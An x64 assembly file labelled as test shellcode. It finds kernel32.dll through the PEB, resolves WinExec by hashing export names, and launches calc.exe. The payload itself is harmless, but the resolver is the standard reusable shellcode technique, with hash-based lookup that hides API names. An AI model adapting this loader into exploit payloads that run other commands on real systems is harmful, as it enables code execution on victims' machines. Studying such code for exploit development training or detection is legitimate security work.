; Test shellcode(x64)
; call WinExec(calc)

section .text

global _start

_start:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push r8
    push r9
    push r10
    push r11
    push r12
    pushf
base:
    ; Get kernel32.dll base address
    xor rbx, rbx
    mov rbx, [gs:rbx + 0x60] ; PEB Address
    mov rbx, [rbx + 0x18]    ; PEB->Ldr
    mov rbx, [rbx + 0x20]    ; PEB->Ldr.InMemoryOrderModuleList (1st Entry)
    mov rbx, [rbx]           ; PEB->Ldr.InMemoryOrderModuleList (2nd Entry)
    mov rbx, [rbx]           ; PEB->Ldr.InMemoryOrderModuleList (3rd Entry)
    mov rbx, [rbx + 0x20]    ; kernel32.dll base address
    mov r11, rbx             ; Save kernel32.dll base address
    ; Get kernel32.dll export table address
    mov ebx, [rbx + 0x3c]    ; Offset NewExeHeader
    add rbx, r11             ; NewEXEHeader
    xor rcx, rcx
    mov cl, 0x88
    mov edx, [rbx + rcx]     ; RVA Export Table
    add rdx, r11             ; Export Table Address
    ; Get AddressTable Address
    xor r8, r8
    mov r8d, [rdx + 0x1C]    ; RVA AddressTable
    add r8, r11              ; AddressTable
    ; Get NamePointerTable Address
    xor r9, r9
    mov r9d, [rdx + 0x20]    ; RVA NamePointerTable
    add r9, r11              ; NamePointerTable
    ; Get OrdinalTable Address
    xor r10, r10
    mov r10d, [rdx + 0x24]   ; RVA OrdinalTable
    add r10, r11             ; OrdinalTable
    ; Get the num of export function
    xor rcx, rcx
    mov ecx, [rdx + 0x14]    ; Num of export function
    xor rsi, rsi
.tableloop:
    ; Get WinExec Address
    jecxz .end               ; If ecx == 0, can't find WinExec
    dec ecx                  ; ecx--
    mov esi, [r9 + rcx * 4]  ; Get NamePointerTable[ecx]
    add rsi, r11             ; Get NamePointerTable[ecx] + base address
    xor rax, rax             ; for lods
    xor r12, r12             ; for hash
.nameloop:
    lodsb                    ; Get NamePointerTable[ecx][rsi]
    test al, al
    jz .hash                 ; If al == 0, end of string
    ror r12d, 0x11           ; Rotate right 17 bits
    add r12d, eax            ; Add al to r12d
    jmp .nameloop
.hash:
    cmp r12d, 0x3C3E6889     ; Compare hash value
    jnz .tableloop           ; If not equal, continue
.found:
    mov cx, [r10 + rcx * 2]  ; Get OrdinalTable[ecx]
    mov ecx, [r8 + rcx * 4]  ; Get AddressTable[ecx]
    add rcx, r11             ; Get AddressTable[ecx] + base address = WinExec function address
    mov r12, rcx             ; Save WinExec function address
    ; Call WinExec
    xor rdx, rdx
    push rdx                 ; 0x00
    mov rax, 0x6578652E636C6163
    push rax                 ; "calc.exe"
    mov rcx, rsp
    inc rdx                  ; 0x01 (SW_SHOW)
    sub rsp, 0x20            ; Allocate stack space          
    call r12                 ; Call WinExec
.end:
    popf
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
